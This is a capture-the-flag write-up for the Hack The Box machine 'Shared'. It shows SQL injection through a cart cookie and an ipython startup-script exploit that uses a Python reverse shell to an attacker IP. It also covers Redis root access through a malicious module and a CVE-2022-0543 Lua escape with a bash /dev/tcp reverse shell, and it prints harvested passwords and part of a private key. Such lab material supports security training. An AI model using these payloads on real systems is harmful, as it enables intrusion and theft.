---
title: HTB - Shared
description: Write-up for the machine "Shared"
toc: true
authors: Alpharivs
tags:
  - HTB
  - redis
  - SQLI
  - ctf
  - write-up
  - ipython
  - hacking
categories: writeups
date: '2022-11-08'
draft: false
featuredImage: /images/htb_writeups/Shared.png
---

## Enumeration

### Host Discovery

```bash
❯ ping -c3 10.10.11.172
PING 10.10.11.172 (10.10.11.172) 56(84) bytes of data.
64 bytes from 10.10.11.172: icmp_seq=1 ttl=63 time=39.8 ms
64 bytes from 10.10.11.172: icmp_seq=2 ttl=63 time=48.3 ms
64 bytes from 10.10.11.172: icmp_seq=3 ttl=63 time=36.0 ms

--- 10.10.11.172 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 36.012/41.390/48.337/5.152 ms
```

A TTL value of around 64 is a solid indicator that this is a Linux system.
### Port Scanning

We begin by doing a full range TCP and UDP port scan, it's not the quickest method for doing things quickly but covering the full range in both protocols can sometimes save us some headaches.
```bash
❯ sudo masscan  10.10.11.172 -p1-65535,U:1-65535 --rate=500 -e tun0 | tee recon/ports.out
tee: recon/ports.out: No such file or directory
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-11-17 18:47:11 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]

Discovered open port 443/tcp on 10.10.11.172                                   
Discovered open port 80/tcp on 10.10.11.172                                    
Discovered open port 22/tcp on 10.10.11.172  
```
We have 3 ports open so let's pass those ports to Nmap and perform a detailed scan.
```ruby
# Nmap 7.93 scan initiated Mon Nov 14 12:02:29 2022 as: nmap -p443,80,22 -sC -sV -Pn -oN recon/nmap.out 10.10.11.172
Nmap scan report for 10.10.11.172
Host is up (0.15s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 91e835f4695fc2e20e2746e2a6b6d865 (RSA)
|   256 cffcc45d84fb580bbe2dad35409dc351 (ECDSA)
|_  256 a3386d750964ed70cf17499adc126d11 (ED25519)
80/tcp  open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://shared.htb
443/tcp open  ssl/http nginx 1.18.0
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
|_http-server-header: nginx/1.18.0
| tls-nextprotoneg: 
|   h2
|_  http/1.1
|_http-title: Did not follow redirect to https://shared.htb
| ssl-cert: Subject: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US
| Not valid before: 2022-03-20T13:37:14
|_Not valid after:  2042-03-15T13:37:14
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
We can see that the nmap reports that the distro is Debian and it's an Nginx server

Also we are being redirected to http://shared.htb to let's add that to our hosts file.
```bash
❯ cat /etc/hosts
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: /etc/hosts
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Static table lookup for hostnames.
   2   │ 127.0.0.1   localhost nyx nyx.localhost
   3   │ # Custom Hosts
   4   │ 10.10.11.172    shared.htb
   5   │ # See hosts(5) for details.
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

## Website TCP 80,443

### Recon

Let's start by doing a quick enumeration of the tech stack.
```shell
❯ whatweb https://shared.htb/
https://shared.htb/ [302 Found] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.172], RedirectLocation[https://shared.htb/index.php], nginx[1.18.0]
https://shared.htb/index.php [200 OK] Cookies[PHPSESSID,PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], HttpOnly[PHPSESSID,PrestaShop-5f7b4f27831ed69a86c734aa3c67dd4c], IP[10.10.11.172], JQuery, Open-Graph-Protocol[website], PHP, PoweredBy[PrestaShop], PrestaShop[EN], Script[application/ld+json,text/javascript], Title[Shared Shop], X-UA-Compatible[ie=edge], nginx[1.18.0]
```

It's a php site that is running PrestaShop which is an opensource e-commerce platform.
### Vulnerability Scanning
```bash
❯ nuclei -u https://shared.htb/ -ni

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   2.7.9

		projectdiscovery.io
[2022-11-17 20:06:56] [ssl-issuer] [ssl] [info] shared.htb [HTB]
[2022-11-17 20:06:59] [tech-detect:php] [http] [info] https://shared.htb/index.php
[2022-11-17 20:06:59] [tech-detect:nginx] [http] [info] https://shared.htb/index.php
[2022-11-17 20:06:59] [self-signed-ssl] [ssl] [low] shared.htb
[2022-11-17 20:07:00] [tech-detect:nginx] [http] [info] https://shared.htb/
[2022-11-17 20:07:19] [robots-txt-endpoint] [http] [info] https://shared.htb/robots.txt
[2022-11-17 20:07:31] [http-missing-security-headers:cross-origin-resource-policy] [http] [info] https://shared.htb/index.php
[2022-11-17 20:07:31] [http-missing-security-headers:access-control-allow-credentials] [http] [info] https://shared.htb/index.php
[2022-11-17 20:07:31] [http-missing-security-headers:access-control-expose-headers] [http] [info] https://shared.htb/index.php
[2022-11-17 20:07:31] [http-missing-security-headers:content-security-policy] [http] [info] https://shared.htb/index.php
[2022-11-17 20:07:31] [http-missing-security-headers:cross-origin-opener-policy] [http] [info] https://shared.htb/index.php
[2022-11-17 20:07:31] [http-missing-security-headers:clear-site-data] [http] [info] https://shared.htb/index.php
[2022-11-17 20:07:31] [http-missing-security-headers:access-control-allow-methods] [http] [info] https://shared.htb/index.php
[2022-11-17 20:07:31] [http-missing-security-headers:access-control-allow-headers] [http] [info] https://shared.htb/index.php
[2022-11-17 20:07:31] [http-missing-security-headers:strict-transport-security] [http] [info] https://shared.htb/index.php
[2022-11-17 20:07:31] [http-missing-security-headers:x-frame-options] [http] [info] https://shared.htb/index.php
[2022-11-17 20:07:31] [http-missing-security-headers:referrer-policy] [http] [info] https://shared.htb/index.php
[2022-11-17 20:07:31] [http-missing-security-headers:access-control-allow-origin] [http] [info] https://shared.htb/index.php
[2022-11-17 20:07:31] [http-missing-security-headers:permissions-policy] [http] [info] https://shared.htb/index.php
[2022-11-17 20:07:31] [http-missing-security-headers:x-content-type-options] [http] [info] https://shared.htb/index.php
[2022-11-17 20:07:31] [http-missing-security-headers:access-control-max-age] [http] [info] https://shared.htb/index.php
[2022-11-17 20:07:31] [http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] https://shared.htb/index.php
[2022-11-17 20:07:31] [http-missing-security-headers:cross-origin-embedder-policy] [http] [info] https://shared.htb/index.php
[2022-11-17 20:07:37] [deprecated-tls] [ssl] [info] shared.htb [tls10]
[2022-11-17 20:07:38] [deprecated-tls] [ssl] [info] shared.htb [tls11]
[2022-11-17 20:08:51] [composer-config:composer.lock] [http] [info] https://shared.htb/composer.lock
[2022-11-17 20:08:57] [robots-txt] [http] [info] https://shared.htb/robots.txt
[2022-11-17 20:09:00] [waf-detect:nginxgeneric] [http] [info] https://shared.htb/
[2022-11-17 20:09:20] [mismatched-ssl] [ssl] [low] shared.htb
[2022-11-17 20:10:09] [openssh-detect] [network] [info] shared.htb:22 [SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1]
[2022-11-17 20:10:30] [tls-version] [ssl] [info] shared.htb [tls13]
```

Although the vulnerability scanner found some issues, none of them are relevant for this ctf environment.

### Directory Brute-Forcing

```ruby
❯ feroxbuster -u https://shared.htb/ -w $(dlist) -x php -k -C 403 -n

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://shared.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
 💢  Status Code Filters   │ [403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        7l       11w      169c https://shared.htb/modules => https://shared.htb/modules/
301      GET        7l       11w      169c https://shared.htb/cache => https://shared.htb/cache/
301      GET        7l       11w      169c https://shared.htb/js => https://shared.htb/js/
301      GET        7l       11w      169c https://shared.htb/themes => https://shared.htb/themes/
301      GET        7l       11w      169c https://shared.htb/bin => https://shared.htb/bin/
301      GET        7l       11w      169c https://shared.htb/download => https://shared.htb/download/
301      GET        7l       11w      169c https://shared.htb/img => https://shared.htb/img/
301      GET        7l       11w      169c https://shared.htb/config => https://shared.htb/config/
301      GET        7l       11w      169c https://shared.htb/docs => https://shared.htb/docs/
301      GET        7l       11w      169c https://shared.htb/upload => https://shared.htb/upload/
301      GET        7l       11w      169c https://shared.htb/pdf => https://shared.htb/pdf/
301      GET        7l       11w      169c https://shared.htb/tools => https://shared.htb/tools/
301      GET        7l       11w      169c https://shared.htb/classes => https://shared.htb/classes/
301      GET        7l       11w      169c https://shared.htb/app => https://shared.htb/app/
301      GET        7l       11w      169c https://shared.htb/var => https://shared.htb/var/
301      GET        7l       11w      169c https://shared.htb/mails => https://shared.htb/mails/
301      GET        7l       11w      169c https://shared.htb/translations => https://shared.htb/translations/
301      GET        7l       11w      169c https://shared.htb/src => https://shared.htb/src/
301      GET        7l       11w      169c https://shared.htb/controllers => https://shared.htb/controllers/
301      GET        7l       11w      169c https://shared.htb/vendor => https://shared.htb/vendor/
301      GET        7l       11w      169c https://shared.htb/webservice => https://shared.htb/webservice/
200      GET        7l        8w       88c https://shared.htb/Makefile
301      GET        7l       11w      169c https://shared.htb/localization => https://shared.htb/localization/
200      GET     3302l    29505w   186018c https://shared.htb/LICENSES
301      GET        7l       11w      169c https://shared.htb/override => https://shared.htb/override/
[####################] - 1h     86016/86016   0s      found:25      errors:29     
[####################] - 1h     86017/86016   20/s    https://shared.htb/ 
```
Nothing interesting found with directory brute-forcing so let's now manually explore the website.
### Exploring the Website

Upon loading we are greeted with the following website.
![main](images/main.png)

Immediately we have what seems to be a hint so let's try to buy something and test this new checkout process.
```text
New checkout process

We are happy to announce that we just launched a new checkout process.
That will allow you to pay easier your orders with most used online payment methods.

Be sure to take a look on it!
```
Let's just purchase a cool T-shirt.
![buying](images/buying.png)
We just add it to the cart and then click proceed to checkout.
![checkout](images/checkout.png)

When clicking proceed to checkout we are redirected to a new subdomain:
```text
https://checkout.shared.htb/
```

Let's add it to the hosts file.
```bash
❯ cat /etc/hosts
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: /etc/hosts
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Static table lookup for hostnames.
   2   │ 127.0.0.1   localhost nyx nyx.localhost
   3   │ # Custom Hosts
   4   │ 10.10.11.172    shared.htb checkout.shared.htb
   5   │ # See hosts(5) for details.
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
### checkout Subdomain

The main page of the checkout subdomain, interestingly the name of the product is translated to a product id, that hint toward some sort of relational database being used so we could just fire up Burpsuite and check for potentially SQLI vulnerable parameters.
![checkout_site](images/checkout_site.png)

## SQLI in Cookie Header

After checking the request to checkout.shared.htb we can see that we have a custom cookie that contains the product id within the Cookie header.
![custom_cookie](images/custom_cookie.png)

### Test
Let's check if it's vulnerable to SQLI.

"'" triggers an error
```bash
custom_cart=%7B%22YCS98E4A'%22%3A%221%22%7D

Not Found
```
adding a comment get's rid of the error so we can confirm that we are dealing with an ***error based in-band SQLI injection***.
```bash
custom_cart=%7B%22YCS98E4A' -- -%22%3A%221%22%7D

YCS98E4A
```
### Data Exfiltration

Now that we know that we are dealing with a SQLI let's try extracting the database, we begin by checking the number of columns.
```bash
custom_cart=%7B%22YCS98E4A' UNION SELECT 1,2,3 -- -%22%3A%221%22%7D

YCS98E4A
```

Now that we know that it works at 3 let's check which column reflects data back to us.
```bash
custom_cart=%7B%22YCS98E4' UNION SELECT 1,2,3 -- -%22%3A%221%22%7D

2
```
Testing by enumerating the version.
```bash
custom_cart=%7B%22' UNION SELECT 1,@@version,3 -- -%22%3A%221%22%7D

10.5.15-MariaDB-0+deb11u1
```

Now we can enumerate the the databases querying information_schema.schemata.
```bash
custom_cart=%7B%22' UNION SELECT 1,(select group_concat(schema_name) from information_schema.schemata),3 -- -%22%3A%221%22%7D

information_schema
checkout
```
We have 2 databases, we are only interested in the "checkout" database so let's enumerate it's tables and columns.
```bash
custom_cart=%7B%22' UNION SELECT 1,(select group_concat(table_name,':',column_name) from information_schema.columns where table_schema like 'checkout'),3 -- -%22%3A%221%22%7D

user:id
user:username
user:password
product:id
product:code
product:price
```
The password and username columns of the user table immediately jumps out so let's extract it's data
```bash
custom_cart=%7B%22' UNION SELECT 1,(select group_concat(username,':',password) from user),3 -- -%22%3A%221%22%7D

james_mason:fc895d4eddc2fc12f995e18c865cf273
```
We have a user name and what seems to be a MD5 hash that we will attempt to crack.
![cracked](images/cracked.png)

It worked!.
## User: james_mason

We can now ssh into the box as the user james_mason.
```bash
james_mason@shared:~$ whoami
james_mason
```
### Enumeration

First let's check other users of the machine.
```bash
james_mason@shared:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
james_mason:x:1000:1000:james_mason,,,:/home/james_mason:/bin/bash
dan_smith:x:1001:1002::/home/dan_smith:/bin/bash
```
Interestingly when checking which groups our user has membership of we can see that james_mason is a member of a suspicious non default group.
```bash
james_mason@shared:~$ id
uid=1000(james_mason) gid=1000(james_mason) groups=1000(james_mason),1001(developer)
```

### Developer Group

A good point to start is searching for all the files that our suspicious group has access to.
```bash
james_mason@shared:~$ find / -group developer -ls 2>/dev/null
    46286      4 drwxrwx---   2 root     developer     4096 Nov 14 12:20 /opt/scripts_review
```
Interestingly we have full access to the /opt/scripts_review directory.

We can also enumerate /var/www/ for credentials as there is a database present there must be some configuration files.

```bash
james_mason@shared:/var/www/shared.htb/ps/app/config$ grep -R -i password
doctrine.yml:        password: "%database_password%"
config.yml:    password:  "%mailer_password%"
parameters.yml.dist:    database_password: ~
parameters.yml.dist:    mailer_password:   ~
parameters.php:    'database_password' => 'T*k#cbND_C*WrQ9h',
parameters.php:    'mailer_password' => NULL,
```
```bash
james_mason@shared:/var/www/shared.htb/ps/app/config$ cat parameters.php
...(SNIP)...
    'database_user' => 'pshop',
    'database_password' => 'T*k#cbND_C*WrQ9h',
```
```bash
james_mason@shared:/var/www/checkout.shared.htb/config$ cat db.php 
<?php
define('DBHOST','localhost');
define('DBUSER','checkout');
define('DBPWD','a54$K_M4?DdT^HUk');
define('DBNAME','checkout');
?>
```
We found 2 credentials but the don't work as login credentials for any user nor they give us access to anything new in the MySql database.

### Processes Enumeration


Before running an enumeration script like Linpeas I always like to run pspy64 and check if any process is being periodically run in the background by any user.
```bash
james_mason@shared:/dev/shm$ ./pspy64 
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done

...(snip)...

2022/11/14 12:51:01 CMD: UID=1001 PID=11616  | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython 
2022/11/14 12:51:01 CMD: UID=1001 PID=11615  | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython 
2022/11/14 12:51:01 CMD: UID=1001 PID=11617  | /usr/bin/python3 /usr/local/bin/ipython 
```

And Voila! we find out that there's a process being run approximately every minute that runs "ipython" inside the directory in which we have full access.

### Ipython Arbitrary Code Execution

After doing some Google-fu [this page](https://security.snyk.io/vuln/SNYK-PYTHON-IPYTHON-2348630) talks about an ipython code execution vulnerability and leads to the release notes of a patch where we can find a link to a [GitHub advisory](https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x) that details the vulnerability.


If we create the nested directory /profile_default/startup inside /opt/scripts_review which is the directory in which ipython runs
```bash
mkdir -m 777 -p /opt/scripts_review/profile_default/startup
```
then we create a malicious python script inside.
```python
import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.34",443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```
And setup a listener in our machine.
```bash
sudo ncat -lnvp 443
```

We can potentially receive a remote shell so let's wait and see if it works.

After some time we successfully receive a remote shell!
```bash
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.172.
Ncat: Connection from 10.10.11.172:33558.
dan_smith@shared:/opt/scripts_review$ 
```

## User: dan_smith

### SSH

User dan_smith has SSH access to the machine so let's check if the private key is present so that we can migrate to a more stable SSH shell.
```bash
dan_smith@shared:/opt/scripts_review$ cd   
cd
dan_smith@shared:~$ cat .ssh/id_rsa
cat .ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAvWFkzEQw9usImnZ7ZAzefm34r+54C9vbjymNl4pwxNJPaNSHbdWO
+/+OPh0/KiPg70GdaFWhgm8qEfFXLEXUbnSMkiB7JbC3fCfDCGUYmp9QiiQC0xiFeaSbvZ
FwA4NCZouzAW1W/ZXe60LaAXVAlEIbuGOVcNrVfh+XyXDFvEyre5BWNARQSarV5CGXk6ku
sjib5U7vdKXASeoPSHmWzFismokfYy8Oyupd8y1WXA4jczt9qKUgBetVUDiai1ckFBePWl
4G3yqQ2ghuHhDPBC+lCl3mMf1XJ7Jgm3sa+EuRPZFDCUiTCSxA8LsuYrWAwCtxJga31zWx

...(SNIP)...
```
### Enumeration

While doing some basic enumeration we find out again that this user apart from being also a member of the developer group is member of a new suspicious group called sysadmin.
```bash
dan_smith@shared:~$ id
uid=1001(dan_smith) gid=1002(dan_smith) groups=1002(dan_smith),1001(developer),1003(sysadmin)
```
### Sysadmin group

Let's check for files that can be accessed by the sysadmin group.
```bash
dan_smith@shared:~$ find / -group sysadmin -ls 2>/dev/null
    17914   5836 -rwxr-x---   1 root     sysadmin  5974154 Mar 20  2022 /usr/local/bin/redis_connector_dev
```

It seems that we have permission to execute a binary called "redis_connector_dev".
```bash
dan_smith@shared:~$ file /usr/local/bin/redis_connector_dev
/usr/local/bin/redis_connector_dev: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go BuildID=sdGIDsCGb51jonJ_67fq/_JkvEmzwH9g6f0vQYeDG/iH1iXHhyzaDZJ056wX9s/7UVi3T2i2LVCU8nXlHgr, not stripped
```

Trying to execute the binary yields the following key information.
```bash
[+] Logging to redis instance using password...

INFO command result:
# Server
redis_version:6.0.15

...(SNIP)...
```

It's logging in to redis using a password, that sounds like it may be hardcoded inside the binary.

### Analyzing the binary.

We start by transferring the binary to our machine in order to examine ir locally.
```bash
scp -i dan.key dan_smith@shared.htb:/usr/local/bin/redis_connector_dev .
```

If we run it locally unsurprisingly it will fail as we don't have an instance of redis running in our machine.
```bash
./redis_connector_dev
[+] Logging to redis instance using password...

INFO command result:
 dial tcp 127.0.0.1:6379: connect: connection refused
```
Before dealing wi RE we could try to sniff the network with Wireshark or we can be more hacky and lazy and setup ncat to listen in port 6379 and see what happens.

```bash
❯ ncat -lnkvp 6379
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::6379
Ncat: Listening on 0.0.0.0:6379
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:58116.
*2
$4
auth
$16
F2WHqJUz2WEz=Gqq
```
Surprisingly it seemed to work, the string "auth F2WHqJUz2WEz=Gqq" seems to have the correct format of a redis authentication command.

### Redis PWN

Let's go back to the victim system and start enumerating it's redis instance.

We confirm that authentication is needed and we have can enumerate the version number.
```bash
dan_smith@shared:~$ redis-cli
127.0.0.1:6379> info
NOAUTH Authentication required.


127.0.0.1:6379> info server
# Server
redis_version:6.0.15
```

Let's try authenticated with the data that we previously extracted.
```bash
127.0.0.1:6379> AUTH F2WHqJUz2WEz=Gqq
OK
127.0.0.1:6379> 
```

#### Malicious Module Exploit

We know that the authentication data that we extracted is of the redis administrator/root user based on the ownership of the redis_connector binary so we could try this [exploit](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand) knowing that we can probably load modules into redis.

After building the exploit in our machine we now have a .so file that we will attempt to load into redis.
```bash
❯ file module.so
module.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, with debug_info, not stripped
```

We transfer it to the victim machine.
```bash
❯ scp -i dan.key ../exploits/RedisModules-ExecuteCommand/module.so dan_smith@shared.htb:/dev/shm/module.so
```

And then proceed to test if we can load the module and if we have code execution.
```bash
127.0.0.1:6379> AUTH F2WHqJUz2WEz=Gqq
OK
127.0.0.1:6379> MODULE LOAD /dev/shm/module.so
OK
127.0.0.1:6379> MODULE LIST
1) 1) "name"
   2) "system"
   3) "ver"
   4) (integer) 1
127.0.0.1:6379> system.exec "id"
"uid=0(root) gid=0(root) groups=0(root)\n"
```
It worked, for some reason we can't get a shell with this method but we can read the contents of the root.txt and get our root flag.
```bash
127.0.0.1:6379> AUTH F2WHqJUz2WEz=Gqq
OK
127.0.0.1:6379> MODULE LOAD /dev/shm/module.so
OK
127.0.0.1:6379> system.exec "cat /root/root.txt"
"6993d7a0acfb8b0..."
```

## Optional: Root Reverse Shell


### CVE-2022-0543

After some investigation on how we could get RCE we find out that a recent CVE has been discovered that affects Debian distros running redis it's a LUA sandbox bypass that is detailed in this [post](https://security.packt.com/redis-vulnerability-cve-2022-0543/).

Let's test if it works in the victim's machine by running the following commands.
```bash
127.0.0.1:6379> AUTH F2WHqJUz2WEz=Gqq
OK
127.0.0.1:6379> eval 'local os_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_os"); local os = os_l(); os.execute("bash -c \'bash -i >& /dev/tcp/10.10.14.34/443 0>&1\'"); return 0' 0
```

And now let's check if ncat has received the reverse shell.

```bash
sudo ncat -lnvp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.172.
Ncat: Connection from 10.10.11.172:60870.
bash: cannot set terminal process group (1766): Inappropriate ioctl for device
bash: no job control in this shell
root@shared:/var/lib/redis# whoami
whoami
root
```

It worked!, using this CVE we can successfully get a reverse shell and fully PWN this machine.

Lux-Sit